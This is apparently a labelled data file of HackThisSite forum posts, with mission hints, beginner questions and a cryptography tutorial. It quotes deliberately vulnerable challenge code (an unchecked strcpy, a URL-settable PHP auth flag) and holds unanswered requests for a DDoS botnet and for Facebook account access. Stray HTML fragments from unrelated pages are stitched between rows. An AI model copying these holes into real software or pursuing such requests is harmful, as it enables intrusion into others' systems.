0	Extended Basics Tutorial	"extbasics tutorial extbasic 1 so we have this: code:  select all void blah(char *str) { char lol[200]; strcpy(lol, str); } the method declares an array called lol of type char and then copies what you input into it. arrays are useful for storing large amounts of similar data. for example, if you had a database of tax rates for people then it would be much easier to make an array of doubles than to make 400 or however many doubles of different names. when declaring an array the format is  code:  select all type arrayname[index]; type is the kind of data the array will hold(i.e. int, string, char, long, double, float) all the variables of an array must have the same data type. arrayname is simply what you want the array to be called. index is an int specifying how many objects will be in your array. to reference an array you do arrayname[desiredindex], arrayname being the name of the array you want, and desiredindex being what element of the array you want to access. it is important to remember that the index starts at 0 so to access the first element of the array you would do arrayname[0]. if you try to call an element of the array with an index higher than the max you set when declaring the array you will receive an error and the program will terminate. extbasic 2 we have this function: code:  select all $lvl_text = file_get_contents($_post[filename]..php); a mistake i made when i first tried was trying to figure out what command i needed to tell the function to find the source code. you dont need one. if you cant get this mission chances are you tried hackthissite.org/index.php and dont understand why it was wrong. try taking a closer look at the code. notice something that may be getting added twice? extbasic 3 code:  select all begin notr.eal create int as 2 destroy int as 0 ans var as create + to out to the mission will be a lot easier if you know a programming language. you really need to think about what each line of the program is doing. it might help to think about possible abbreviations.  extbasic 4 code:  select all {user types 6,7} begin f.ake var int as in int var as in out var int again, pretty easy if you know a programming language. dont be confused by the first line, the user is entering 6 and 7, the first part isnt actual code. hmm, the program then makes two variables whose values must be this ""in"" thing. what could in be short for? next the program out var and int what could out be short for? extbasic 5 here is the shell: code:  select all #!/bin/sh rm ok sed -e ""s/eval/safeeval/"" <exec.php >tmp && touch ok if [ -f ok ]; then rm exec.php && mv tmp exec.php fi the only part you need to worry about is the shell. its really easy to overthink this. you can think of sed as the find/replace function in other programs. basically, it is finding eval in exec.php and replacing it with safeeval in tmp. the only problem is that always owned sam forgot something. if you arent familiar with sed, you can learn a lot here: http://www.grymoire.com/unix/sed.html extended basic 6 code:  select all <?php $user =$_get[user]; $pass = $_get[pass]; if (isauthed($user,$pass)) { $passed=true; } if ($passed==true) { echo you win; } ?> <form action=""me.php"" method=""get""> <input type=""text"" name=""user"" /> <input type=""password"" name=""pass"" /> </form> <?php function isauthed($a,$b) { return false; } ?> ok. lets look at the code. it gets the username and password then runs the function isauthed on them. if isauthed(user,pass) returns true then the variable passed is set to true. (the default for booleans is true that is why you dont need ==true in the if statement.) next, if passed has been set to true we win the mission. hmm, it doesnt look like we can get the password anywhere, but maybe we can just skip right past having a correct username and password. think about what value you would change if you could change one. now how can we change that value? it says enter the correct url and it also says that the sysadmin doesnt know much about web configuration. what could we add to the given url to send the information we want?"
1	Gathering information behind a home router	hey all, ive been under the impression that in the absence of internet-facing vulnerable services on a network, an attacker might try to compromise the router itself and use that as a point from which to attack machines inside the network.  so with that assumption, i figured id try to sate my curiosity and see just what one could do once a router was under malicious control.  the problem is, i honestly dont know much about what can be done, and google is only so helpful (actually, i mostly have to use bing these days as im behind the great firewall and i dont currently have a proper vpn at my disposal.  ugh.  but thats neither here nor there.) now, since the point of this exercise doesnt yet involve the actual exploitation of said router (ill get to that when i feel im ready), i set up a simple d-link router i had available inside my network with unsecured remote administration enabled, and put a computer running a couple virtual machines behind it. this means, as youve probably figured out, that i can have complete? control of the router from outside the lan.  from here i know of a few things that can be done, like changing the dns to a malicious server to redirect traffic to spoofed sites, and whatnot.  aside from that, i can also see which machines are connected to the router.  what im not so sure about is whether there is any way to gather further information about these machines from outside the network.  i tried port forwarding and scanning that range with nmap, but still all i can see are the web administration port for the router, and port 21 which shows up as tcpwrapped and is not accepting incoming connections. does anybody know of any way to scan or otherwise obtain a little more information about the computers behind a compromised router?  i feel like ive hit a dead end.   on a similar note, how would this be different if the router in question were an enterprise-grade router?  i cant exactly afford a nice cisco or other of that type, so i cant test it myself at this point in time, but its still something id like to know about. if anyone could shed some light on this subject for me, i would really appreciate it.
3	Is HTML a programming language?	"logs from irc wrote: [ <jon> oh yeah. [ <jon> all you need is a compiler. [ <jon> e.g. an interpreter. [ <button> and the browser is an intrepter... [ <button> i see somewhat... [ <jon> it would be a different type of logic than c or anything reasonable. but my point was that its possible. [ <button> but jon  html is only used to define what certain things are [ <button> it can by itself take no actions on the objects [ <button> it needs js for that [ <jon> are you sure? [ <jon> its markup, like any programming language. [ <button> yeah  html is designed to seperate design and objects [ <button> most browsers ignore that rule and add there own default design [ <jon> but in this case it would be interpeted by a compiler into binary [ <button> but its still not part of html in of itself [ <jon> its not that anyone would ever do such a thing (c is our friend). but my point was that its not only plausible, but very possible. [ <jon> most people are confused on what a ""programming"" language actually is. [ <button>  its not possible for html the way it is designed to perform even basic arithmatic [ <jon> sure it is. [ <button> how? [ <jon> providing its interpretted correctly. [ <jon> which is nothing short of what a compiler is designed for. [ <button> but the way it is designed it cant ever operate on previsly defined data [ <button> in fact the real way for a browser to display html with no css/js is a blank page or just the text [ <button>  http://www.w3.org/markup/ [ <jon> html/and xml are all about data. and letting what is usually a browser interpret that data, and react accordingly [ <button> yes  intrepet but no do anything with [ <jon> if your browser doesnt do anything with the data, then how do webpages work? [ <jon> why does <body bgcolor=""red""> produce a red background? [ <button> they are invalid  they arent supposed to do anything with it unless it has css or js [ <button> bgcolor is taken out [ <button> it has been replaced with style="""" [ <button> from css [ <jon> alright, then tables. [ <button> b/c bgcolor is against the point [ <jon> provide formatting information to the browswer, and it then puts the text in nice little rows. [ <button> tables should not be used for design  [ <button> a browser should show a table as pure text unless it has css [ <button> most browsers use a default style [ <jon> its just an example of how html provides data for the browser, which reacts accordingly. [ <button> but that it not html [ <button> html converted to c should look like [ <button> var el1=""table"" [ <button> var el2 = ""fdk"" [ <button> var el4 = ""data"" [ <button> its basicly a list of data with no actions [ <jon> html is xml, and xml is all about data. if you have data, you can do almost anything you like with it. [ <button> yes [ <button> but xml is merely data [ <jon> what is a c program? just a bunch of text? [ <button> it is not the actions you would take [ <jon> says who? [ <button> c contains both data and actions [ <button> says the w3c [ <jon> whos to say that html or anything in this world cant be interpreted into machine language? [ <jon> you can convert machine code into a picture, and visa versa. which should be proof enough that the concept is sound. [ <button> erm  it can be [ <jon> vice versa maybe.. my spelling is not so good. [ <button> it would look like [ <button> store this to memory [ <button> store b to memory [ <button> store c to memory [ <button> and thats it [ <button> it would have no further actions.... [ <jon> brilliant colors? yes.  as well as awesome patterns [ <button> no colors [ <button> colors are part of css [ <button> not pure htm [ <button> not pure html [ <jon> html can be, and is, interpretted in many ways. [ <button> yes  based upon css or js [ <jon> no. [ <button> pure html is an array of data [ <button> no more [ <jon> yep. and if you have data. you have everything. [ <button> no  [ <jon> at least.. everything required to build an executable file. [ <button> you need to be able to take actions upon the data [ <jon> who says you cant? [ <button> which html has no built in ability to do so [ <jon> how do you think your compiler works? [ <button> jon the html is like the main file while css is like the header [ <jon> (assuming youve used one) [ <button> the compiler cant work w/o either [ <jon> yes it can. [ <button> jon not if the main file calls functions from the header [ <jon> who says that the main has to call functions from a header? [ <button> jon how should a browser display this line correctly [ <button> <strong>fun</strong> [ <jon> doesnt matter. [ <jon> what matters is what it does. [ <button> what does that line do then? [ <jon> in a standard browser? [ <button> no  [ <button> in a perfect browser [ <button> (one that actually follows all rules) [ <jon> like i said. it doesnt matter. what matters is what the browser decides to do with that information. [ <button> where html elements define the abstract structure of a document, css directives are interpreted by the web browser to render those elements in visual form.  [ <button> it does matter  [ <button> a perfect browser would do nothing with that line [ <button> as it doesnt tell it to do anything [ <button> it would just display the text as is  maybe   <jon> yes, because thats how the browser was designed.  <jon> what if you designed a browser to convert that into machine code? well then youve got a compiler.  <button> besides no html specification has ever called html a programming language, or anything like that. [16: <jon> and? [16: <button> ml documents are sgml documents with generic semantics that are appropriate for representing information from a wide range of domains. [16: <button> html is information, not instructions [16: <jon> no one ever referred to c as a programming language in the 1700s but that surely is not proof that it is not one today.  <jon> information is, and can be instructions.  <button> hrm  i see where we differ at least...  <jon>   standards arent set in stone.  <jon> is my point.  <button> information is mearly data, inscructions are operations based upon data  <button> 1 + 1 = 2  <button> 1 is data  <button> + is an insrction  <jon> + is data.  <button> would you say that 1 is an instruction  <button> + is not data  <jon> everything is data.  <button> + by itself would tell you nothing  <button> jon do you consider ms word documents to be a programming language?  <jon> if they were interpretted correctly, yes.  <button> what about word lists used by jtr  <jon> again. under the circumstances as i have previosly described, yes.  <button> what is ""a"" ?  <jon> data.  <button> and is that a program?  <button> and is the alphabet a programming language?  <jon> could be. a compiler could find all instances of a, and replace them with the equivalent of mov eax,97  <button> jon if something is a programming language then there must be something that is not a programming language  correct ?  <button> according to you all things everywhere is a programming language  <jon> not necesarrily(spelling)  <button> dont worry about spelling   <button> html is only a static collection of data  <button> jon   http://www.cs.tut.fi/~jkorpela/prog.html  > i took some of my arguments from there  read it  its interesting  anyway  i see where we differ  <button> its mostly definitions... 06 * button has a stricter definition  <jon>   people often dont see programming for what it really is.  <button> jon some people assume too much is programming   <button>   <button> anyway  i enjoyed talking to you...  <jon> lol. certainly not.  <button> how often are you on?  <jon> same.  <jon> from time to time.  <button> lol kk  are you ever on the forums?  <jon> less and less though, finals are coming up.  <jon> not in a long time.  <button>    join again hackthissite.org/forums  <jon> not on cs anymore?  <button> no  they split   <jon> why?  <button> cause the cs oldies didnt like hts  <button> mind if i paste these logs?"
1	Wargames dosnet	hello all, hope this is the right place to put this. ok long story short.. my college mark for this term is 50% from the practical work we do. were split into pairs for a kind of wargame, one of us is the attacker and one the defender. this month im meant to be attacking my friends server (its all on our private network.) this week is meant to be attack and defend against denial of service. i tried a basic dos from my box but he mitigated it after a while. so what im looking at is a ddos tool for a botnet, ive got a few other computers on the network i can use. by the rules though i cant actually go and run the dos from each box but if i could create a dosnet with them then i could win this week. i dont have the skills to make my own and i cant find them anywhere, ive checked p2p networks and google. ive heard about mydoom and wintrinoo (i dont want to have to go linux and use trinoo.. that wont end well for me) but when i try to find any kind of server configuration for them all i can find is ways to stop them. any help much appreciated.

1	Cracking Facebook passowrd but...	this is a challenge i have been facing lately. i have been trying to hack a facebook account but in the process i do not want to change the password. i was wondering if anyone know of a way to do this?
3	Who do you think is to blame when iCloud is hacked?	"http://mybroadband.co.za/news/security/ ... apple.html from my broadband ""a hacker’s release of personal photos of actress jennifer lawrence and other female celebrities on the internet on the weekend has again drawn our attention to the security of our personal information online. are we really aware of what we upload? and how can we make sure the information we intend for private viewing remains private? with new devices incorporating features for recording personal data, such as the health monitoring technologies used in samsung’s gear and the apple health app, should we be even more concerned about our ability to control our private data? most of the hacked images were reportedly obtained through apple’s icloud service which can automatically back up personal data from apple products to its servers. cloud confusion how icloud works is baffling even to some computer security experts. the response from apple has been unequivocal. while the tech giant said it was “outraged”, the official response noted:     none of the cases we have investigated has resulted from any breach in any of apple’s systems including icloud or find my iphone. so individual users were responsible for any failure to take the proper precautions to make sure personal data remains in personal control. the blame game like those who defend the hackers of stolen photos, apple is blaming the victims of the attack without acknowledging the role its service plays in opening up private data to these attacks. this position is indefensible for several reasons. social media and services such as icloud present us with countless examples of personal data doing things that seem counter to the will of the individual. in a study i published last year, facebook users sometimes feared their data to have a “life” that does not correspond to that of the person who “owns” the data generated. like our facebook profiles, we assume what we backup with any cloud services to be “our” data. yet the terms and conditions of whatever you upload to icloud state:     […] you grant apple a worldwide, royalty-free, non-exclusive license to use, distribute, reproduce, modify, adapt, publish, translate, publicly perform and publicly display. these words mirror similar statements in facebook’s terms of service. at the same time, apple is clear to claim:     […] you, and not apple, are solely responsible for any content you upload, download, post, email, transmit, store or otherwise make available through your use of the service. merely using icloud means that apple can do what it wants with your data, but you – and only you – are responsible with what happens to that data. placing the blame on the individual, as apple does, results in a common response whenever data are thought to be beyond the control of the user: delete all of your personal information online, shared intentionally or not. this response simply is not good enough given how cloud services operate. they make multiple copies in multiple locations, stored on multiple servers and hard drives across the globe. these files are uploaded automatically and are built into new features of our mobile devices. when an individual deletes a file, this does not mean that it is actually deleted, simply by virtue of how computer storage works. all about trust apple may wish to absolve itself of responsibility when individuals lose control of their personal data. in legal terms, apple places all burden on the individual for the management of their data. yet understanding the control of data as a personal matter disregards how these services actually operate. if apple and other cloud-based services want our trust, then they have to acknowledge the role their products play in perpetuating anxieties of data-out-of-control. they must refuse to place sole responsibility on their users – the victims of these attacks. grant bollmer does not work for, consult to, own shares in or receive funding from any company or organisation that would benefit from this article, and has no relevant affiliations.     this article was originally published on the conversation.     read the original article."" what do you think? i believe the people are to blame in some sense, because you shouldnt post the nudes of you online in the first place. but secondly apple is to blame for their shitty security measures."
1	New to hacking, some help would be nice	"im new to this kind of hacking stuff.. well anyway i want to learn hacking. just to let you know im not a complete noob at computers. i have experience in programming with c++ and visual basic, and also a little with html and very little javascript. i know sdl (which is a cross-platform api that works with c++) and ive made several games using c++ and sdl. i have about 2 years of experience in programming, but i never really got much into learning about web/server design, etc... ive gotten to level 5 of the basic missions (dont give me hints, i still want to figure this out by myself) and i already complete dall of the javascript missions and im on level 4 in the realistics mission.  now about hacking. how can i get started on the subject? i know that theres many so-called fields of hacking. i want to learn how to do crazy/weird stuff with my computer, how to crack passwords (but not vandalize websites), and stuff like that. ive read several hacking tutorials/articles/lectures but they dont seem to be helping much. the problem is that im not sure where to get started.  should i start with html? javascript? php? sql? learning the command prompt? how about learning more computer theory? or should i continue on learning with c++?  ive already gotten tired of making games, and besides ive already found this hacking thing to be more interesting than making games.  i know theres also other languages such as lisp, perl, asp but i wont really worry much about that.  but i really do need my questions to be answered.  oh and please answer these too:    -do i absolutely need linux to hack? why is it important that it is open source? can i still be considered a hacker (or at least know how to hack) if i dont have experience with using linux?    -is php/javscript/sql compatible with linux? how about perl and lisp?   -what are some other languages that are important to learn for hacking?   -is a .php file an actual webpage, or does it just contain the code for a webpage, or both?   -is it a good idea to create a website by hand with html and javascript? would it be enough for the site to function well?   and for html, i made a test website and i included on it what i learned about html so far. my css sheet wont work for some reason. do i have to add more to the css sheet or am i doing something wrong?  code:  select all <html> <head> <title>my website</title>  <link ref=""stylesheet"" type=""text/css"" href=""style.css"" /> </head> <body> <p><h1>my personal website</h1></p> <p>wanna see what this website has to offer? then go to the <a href=#navigation>website navigation menu</a></p>.  <p><em>regular emphasis</em></p> <br /> <p><strong>strong text</strong></p> <br /> <p><h4>unordered list:</h4></p> <ul>    <li>list object 1</li>    <li>list object 2</li> </ul> <br  /> <p><h4>ordered list:</h4></p> <ol>    <li>list object 1</li>    <li>list object 2</li> </ol> <br /> <p><h1 id=""navigation"">website links</h1></p> <p><strong><a href=""page2.html"">page 2</a></strong></p> <p><strong><a href=""survey.html"">survey</a></strong></p> <br /> <img src=""cubes.png"" width=""100"" height=""100"" alt=""cubes logo"" /> </body> </html> css: code:  select all strong {    font-style: italic;    text-transform: uppercase; } ____ thanks"
2	Phone (landline) hacking?!	im not sure if this is in the right place... ah well, here goes.  earlier today my friend seems to have had his landline (on bt) hacked... im just wondering how this is possible (no, im not going to try it, im just intrigued by how this has happened). i know little about landline phones, but he said that someone called him when he had an answer machine on and there was office sounds but no actual message. he thought this odd so tried to find out who it was.  upon further inspection he found that it was his own landline number that had called. i understand that there are many online services that allow you to spoof a number, but after talking to his provider (bt) they claim that he may be charged for all calls made by the hacker (if it was me, id set up my own premium line and call that with the hacked phone number meaning that id get paid from the line and theyd incure a bill).  is this possible? if so how (and how can i prevent it)?
3	Good site to learn coding	i am a noob on this site, and i kept getting stuck after mission two and had to keep looking for help.  i finally got tired of that because it wasnt helping me learn how to actually figure out problems for myself.  to help myself i asked a friend what a good site to learn programming is and he linked me to  http://w3schools.com  which is teaching me more than i ever even knew about.  bottom line... all noobs who do not know how to code should visit this site before they start any missions.
2	HTS has been taken over by demons or something?	"i was looking through albanian website(real 13) and put a wrong url and it came up with regular hts wrong url but when i hit back a picture popped up with fire and demon and stuff with large red font saying ""hack this site has been hacked by demons"" and then albanian page loaded. it kind of scared me lol. any one else see this before or what?????"
1	one of a million newbs	yes, as i can see ur forum is overloaded with idiots like myself, i decided one more couldnt end the world. i have just started, and have made it to basic challenge 4 (ie first email password recovery challenge with my great friend sam the security man). now i do not want a password, before you ask. id like to spred som e thought and see if i am as far off as it ussually seems. i looked in the source, found the section i need, etc. found the email adrress being used to recieve the password by email for the challenge. now my initial atempt (dont laugh im serious) was to edit this to read as my own email, as the requirements for the challenge included an email. but after no luck i would like to know: is it possible to edit this soucre code or not? i mean i can do what i like in side of notepad. but will it affect anything and if it can how can i force it to? if i am totally off the mark, and a pointer can be provided without clearly telling me what i need to do, it would be much appreaciated. i have learnt basic html, and created the site  www.makeshiftfilms.com.au , but as you can see it is basic in that it required not password work. is creating webpages with password entires a good knowledge to have?
1	Hi need SOME help	i have this program that needs to be access and i lost my password it been year since i used it i was doing another way but any ways i need to know if some can help me i cant get this to open ..  not here is a way so you can see what i need help with... today
1	3g modem	im trying to crack my 3g modem but it has an encryption which is not wep or wpa/2!  it has some encryption called umts, how can this encryption called umts be cracked with either an alfa router or kali linux or anything else for that matter assuming that it can??????  is umts harder if not impossible to crack unlike wep or wpa2-psk encryption??????  what about a 4g modem assuming it also has umts encryption, can that too be cracked or not??????  is umts impossible to crack or not?????  ive already cracked most wep and wpa2-psk encryption but have yet to crack this new type of encryption!!!!!!!!!!!  can a kali linux or alfa router expert please tell me if im gonna be able to crack this since so far ive had no success?  rsvp.  thank you.
1	After All The N-Posts, Think Im a Different Kind of Newbie	so i stumbled across this website, mainly because i was looking up way to hack our own company website. by profession i am a quality assurance automation engineer/architect. so i work with internet technologies on a daily basis. by hobby i have been programming for over 16 years. when i was nine i had an old 286 pc that ran dos 3.3, there wasnt much to program with that was readily available, but ms-dos came with two distinct advantages for the avid programming learner - gw-basic and debug. after i learned how to use gw-basic, i realized that it wasnt taking me where i wanted to go, so i visited the library to check out a book on intel-x86 machine op-codes and assembly commands. i already knew that i could see the underlying logic of an executable program by running debug on it, and i could already understand the logic of using registers to store data, as well as ram, and i understood the pc and program stack as well. all i needed was a way to either binarily write a program or assemble it. debug provided for both interfaces, and though it took a very long time to design and write a decent program using machine code, it was always worth it. of course nothing ever got above a few hundred bytes. anyway, around that time as well, my uncle gave me my first c compiler - microsoft c and masm. sadly i never got into masm much, but c intrigued me. and so i went to work consuming the books that came with it and writing small c programs. i got myself into lots of trouble by peeking the memory address for various devices, and monitoring interaction response code from my keyboard, mouse, and modem. in school i learned both pascal and c++ during a number of computer science classes, and math was always one of my favorite subjects. in my computer science courses i excelled, and experienced my first network-based beat-the-system hacking thrill in that class when the district network systems admin paid us a visit (he was the nerdiest and dumbest suit i have ever met). later on in my career i learned several higher-level languages in order to more effectively write windows gui-based software for my jobs, including java and c#.net. other languages and shell-scripting tools i know and use daily include, bash, batch, vbscript, ruby, javascript, wmi, html, css, and today i learned about apache ssi (which im embarrassed i never learned before). here and there ill have to hack some python or perl, but that is not as common as those other languages, and more recently ive been returning to my roots and learning about high-level assembly language and c/c++ more. (i also take pride in knowing asp.net, php, and perl-cgi). i see a lot of people here asking how to hack, or what language they should learn, and i think back to my first college-based computer science course, introduction to computer science, where i met the first person id ever met who i knew would fail at programming, and he did - he was coming from a background in business management, had never programmed before in his life, and knew little about how computers operated or what made them tick. i didnt say anything to him at the time, but i was concerned about how well hed do, because programming isnt all fun and games, and even making a game can be tedious at best - there is a lot to learn before you can get to that level. to say the least, he did fail, and i never saw him in any of my successive classes in college (think he went back to business management). but if you want to learn how to be a hacker, there are several pieces of paper (website) that you can view, and the most important thing is to learn how to program, have the ever-increasing desire to learn how things work, look at lots of other peoples code (sf.net is a good place to start for that), and i suppose dont expect to know everything all of a sudden. hey wait - im not a hacker so how can i say that? anyway, im learning a lot here - id have to say that the beginner challenges - 1 through 7 were a breeze, but im stuck on 8 - please, please nobody help me though - because i know ill just feel stupid if you do. thanks, and i hope that i continue to learn more here. im really glad that google brought me to this site. nathan lane
3	Hacking and programming	i got a question. im not trying to learn how to hack, and wondering if programming is optional; im just wondering specifically about this question. how does learning to program fit in with hacking? specifically?
1	How to login to do challenges ?	"hi everybody! im newbies. i tried at loginning to do challenges, but i cant because it have an error when i typed pass ( = pass when i login to this site ). this is error:  "" sorry, but you have entered an incorrect password "" . how to slove this problem ? thanks a lot"
0	Who Wants To Learn How To Program?	now, im serious, who really wants to learn how to program? and why should you? often times on these forums (and i havent been here too long to take notice) many users seem to be getting bored with all of the hassle that the challenges provide. many of you want to become a hacker very quickly, or just automatically know what to do to hack x system or y application. with a good 16 years of programming experience behind me, including experience in everything from machine language to basic, and from heavily typed high-level languages like java, c, and c# to scripting languages like python and ruby, even i dont have all of the programming practice it takes to be able to hacking something up or down. in my mind programming and understanding how computers do what they do are at the root of hacking. this idea is simply based on my observations and experience. now some of you ask, how can i learn programming the fastest? the quickest way to learn how to program is by doing it. ill share an example from my own life, though granted it is a relatively dumb part of my life. back about a year ago, i decided that it was definitely time to stop pretending i didnt want to learn microsofts proprietary c# programming language, and time to start learning it (yes, i have a little grudge against ms). so i researched a few books on c#, found a couple at my local barnes and noble booksellers, and decided upon  c# for dummies  (for anyone wondering this for dummies book is relatively good, though not great). once i got it home, i began reading it from cover to cover. within a couple of days i realized that most of the knowledge contained in the first half of the book i already knew from my own experience. so i began to skim the remaining chapters, and noticed that they werent much help either. so i, having much experience in other programming languages, decided to just go at it myself. i think that the most difficult part about that was deciding upon a project that would satisfy my appetite to learn c#. this was by far not my first c# program to date - that was a simple calendar/clock widget for the desktop that i wrote. soon, however, i luckily received a task to write a piece of automation to load-test our website at work. that suited me well. i didnt know anything yet about xml, configuration, linq, and a myriad of other technologies introduced by microsoft in their .net framework as of late. now, though not proficient, i can easily debug, write, and fix programs written by other people in c#. the moral of that story is that practice does bring one closer to perfection and books cant replace what practice gives to a becoming hacker. i have written dozens of badly coded apps in c# and a couple of well-coded ones, but im much better at coding in c# now than i was about a year ago. this brings me to my point. i have often looked to other programmers around me to gauge my abilities and to learn where i could improve. several years ago i came across  this  and  this  websites. both describe the hacker as somebody who thrives for knowledge, especially in computer technology. again, programming is at the root of hacking, and i dont think you can really be a hacker without knowing how to program. whats more is that you can fairly easily be taken by somebody if you arent intimate with computer hardware and software technologies. i believe we are blessed to have such a conducive atmosphere now in our world to learning about programming. programming languages are free to download, install, and use however you want. i know there are links all over these forums for this kind of stuff, but i think theyve been somewhat lost. if youre running linux you can use you package manager to locate these programming languages, but if youre running windows, i think that the task is much more difficult. here are a few of my favorite programming tools, available for free, some open source and others commercial, but free nonetheless. ftp://gd.tuwien.ac.at/gnu/mingw/  mingw - minimalist gnu tools for windows http://www.microsoft.com/express/  microsoft visual studio express editions http://www.python.org/download/  python from python.org http://www.activestate.com/products/activeperl/index.mhtml  perl from activestate (also has mac versions) http://www.php.net/downloads.php  php from php.org http://dev.mysql.com/downloads/mysql/5.0.html#downloads  mysql community server http://www.postgresql.org/download/  postgresql - the worlds most advanced open source database http://java.sun.com/javase/downloads/?intcmp=1281  java jdk from sun microsystems http://www.gnu.org/software/mit-scheme/index.html#download  mit scheme programming language - based on lisp http://www.squeak.org/download/  squeak - open source smalltalk vitual machine environment http://www.ruby-lang.org/en/downloads/  ruby scripting language http://sourceforge.net/project/showfiles.php?group_id=6208  nasm - the netwide assembler http://httpd.apache.org/download.cgi  apache web server cheers.
2	ok heres the problem..	"a menu keeps popping up that says ""your system is probaly infected with the latest version of spyware.cyberlog-x"" etc etc.  my desktop background has the ""your systems screwed, click here"" thing that changes everytime i restart/ turn my computer on.. ive tried running sweeps and i get no threats found.. any one have any idea how to get rid of this virus?"

free security programs out there that work well. note: one of the big problems with free security software is that you have to manually update your virus definitions, because if you don&#8217;t update them they will be out of date and your software will be useless against newer viruses.</p> <p>security software:</p> <p>avg anti-virus free editon - <a

know a lot of people already do this, but defrag your pc. defragging your pc reorganizes your files so that they are closer together and in a better order than they were originally, which leads to your pc being able to jump from one file to the other faster. disk defragmeter is located in start menu/all programs/accessories/system tools/disk defragmenter. click on disk defragmenter, and when the window pops up click defragment. after it is done just exit out and start using your computer again. it should be a little bit faster now.</p> </div>                                 <p

3	About Sending Staff PMs about Missions	"in the existence of hts many members of the staff in not just the moderation team but developers as well have noticed a trend of users from the forum sending personal messages (pms) to staff expecting help on the missions. what may not be obvious is some of us get bombarded with these every week on a consistent basis.  so the official hts staff policy is now this: ""for each of the hts missions with the exception of the logic set there are a large amount of resources ranging from hints from moo on the hts irc, a section in the forum dedicated to mission, and possible articles on the website and the greatest resource of all  www.google.com . sending pms to staff members asking help for missions is a discouraged practice that is frowned upon and is considered a sign of laziness. therefore staff members are not expected nor required to reply to any messages involving this subject matter. for any hts users who ever are considering in helping out with staff who partake in this action this will also reflect poorly in the future."""
0	Cryptography For Fun	"cryptography for fun cryptography is the science of secret writing. that said, cryptography can be found in many applications in the world including games, puzzles, email, digital rights management (drm), digital signatures, media streams (both analog and digital), and many others. the key to cryptography is the method of both encryption and decryption. cryptographic systems come in many flavors. some forms are replacement based, and others are cyclic or encrypt using a key-based system rather than a set of all possibilities. an example of replacement based encryption might be the following simple key: code:  select all a b c d e f g h i j k l m z y x w v u t s r q p o n in this example, the key is symmetric, or in other words the same key may be used to encrypt and decrypt messages. if you take the phrase, ""hackthissite.org teaches hacking and basic technological understanding."" using the symmetrical replacement key, then you get the following cypher-text: szxpgsrhhrgv.lit gvzxsvh szxprmt zmw yzhrx gvxsmloltrxzo fmwvhgzmwrmt. one of the biggest problems with this encryption algorithm is the size of the key and the relationships in the key. the key only contains 26 letters, and effectively has 13 bi-directional replacements. on top of that a quick analysis shows obvious patterns like word size, spaces, punctuation, and duplicate letters together. if the text were very large, then a dictionary could be used to figure out one or two word revealing the letter replacement scheme. lets take the same topology for the key and transform it into a cyclic key: code:  select all a b c d e f g h i j k l m n o p q r s t u v w x y z --------------------------------------------------- z y x w v u t s r q p o n m l k j i h g f e d c b a y x w v u t s r q p o n m l k j i h g f e d c b a z x w v u t s r q p o n m l k j i h g f e d c b a z y w v u t s r q p o n m l k j i h g f e d c b a z y x v u t s r q p o n m l k j i h g f e d c b a z y x w now we have five keys in effect, acting as one key. in this case, you would use each row of the key in a cyclic manner or cycling through each row for each letter. taking the same plain text message, we could get the following cypher text. syvmcsqfengu.vij guauovg qwtpqkq vmv wwdrw euomkmiprwxl bmvtfdgyktnms. this is somewhat more difficult to automatically decrypt because letters that are duplicated together are not as likely to create common duplicate letters as found in the english language. we still have the problem of punctuation and obvious word separation, and if you notice there is one instance where the actual unencrypted letter is the same as the encrypted letter, which may be considered a flaw in the key, namely on line four, l == l. but now for example, vmv, is a more difficult word to decrypt since there are no three-letter words in the english language that begin and end with the same letters aside from names, like mom, dad, and bob. but since the first letter of vmv is not capitalized, we can guess that it is not a name (unless the writer did not speak english very well.) lets now briefly look at an encryption algorithm that i created when i was younger, which i call five-bit encryption. five-bit encryption defines the alphabet as all capital letters, removing any possibility that letters may be guessed by seeing capitals, and defines the alphabet within a five-bit space, or 31 characters. this makes it possible to encrypt spaces and common punctuation like periods and commas. the key appears something like the following: code:  select all a b c d e f g h i j  k  l  m  n  o  p  q  r  s  t  u  v  w  x  y  z  .  ,    <sp> [31] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30    31 this key also uses a binary number system that only uses letters. since we are using five bits, we need five bit-fields, which are formally designated as abcde where e == 2^0 == 1. as an example of encryption using this algorithm let me simply encrypt my name, nathan: bcdeacbebcd now you see a jumble of the five letters i mentioned, each representing a bit-field. the problem with this algorithm that youll see now is that it is difficult to decrypt the message being relayed. the method of decryption is to follow until the letters until you reach a letter representing a higher bit-field than the previos one. so breaking up the message we see the following characters: bcde ac be bcd only four characters and not six!!! this problem occurs because not every instance of a letter will include a higher bit to start than the last bit of the last letter. ideally we would somehow come to six letters, but lets decrypt what we have now to see what we get. code:  select all 15 20 9 14 o  t  i  n otin  is not even close to the original message. except that it contains two of the original letters. this is whats called a lossy encryption algorithm. lossy encryption is often used where messages dont need to be perfectly what they were. one place where lossy algorithms are used is in jpeg compression. jpeg compression, however removes parts of the image that arent important to the viewer. in this case were missing some very important pieces. in order to get the original message back from this encryption we must calculate all of the permutations of this message and match against them something that makes sense. eventually we would come across code:  select all 14 1 20 8 1 14 n  a t  h a n but you can now see clearly where the problem lies. when creating encryption two possibilities are available, similar to when were optimizing a program, 1) speed, or 2) difficulty. we cant have both because it takes a long time to generate a difficult to crack key, and a fast algorithm requires a relatively small key. the answer to the speed problem is block-cypher algorithms. block-cypher algorithms rely on symmetrical keys, meaning that the same key and algorithm is used to both encrypt and decrypt a message. a very simple, no brainer example of this would be to perform xor between a key and the cypher text. binarily speaking xor will always produce a 1 where a 1 is one of two operands and a 0 (zero) where both operands are either 1 or 0. for example: 0 xor 0 == 0 0 xor 1 == 1 1 xor 0 == 1 1 xor 1 == 0 now using this knowledge and understanding that bytes or the characters that you see on the screen are made up of bits or 1s and 0s, we can perform some basic encryption. first lets create a key. example key: hi my name is nathan lane (remember that the longer the key is the more is will do for a longer message) example plain-text: this is an example message that is absolutely arbitrary and serves no purpose but to be used in this example bit table code:  select all a 00000      n 01101      <sp> 11010 b 00001      o 01110      .    11011 c 00010      p 01111      ,    11100 d 00011      q 10000          11101 e 00100      r 10001      ?    11110 f 00101      s 10010      0    11111 g 00110      t 10011 h 00111      u 10100 i 01000      v 10101 j 01001      w 10110 k 01010      x 10111 l 01011      y 11000 m 01100      z 11001 both the message and key here are a good size. now using the table above we will perform xor on each character based on this matching. text:   this is an example message that is absolutely arbitrary and serves no purpose but to be used in this example key:    hi my name is nathan lanehi my name is nathan lanehi my name is nathan lanehi my name is nathan lanehi my na xored we get this: cypher: ups?cs  mjamf bpyd b?zsncdsjlyjxi?? jauguadlvalrmmuz aannp?imdpjsjkoxv rckvmanmjxtc?.mio eqiaayhfwmnmuvge now you can see that this is a 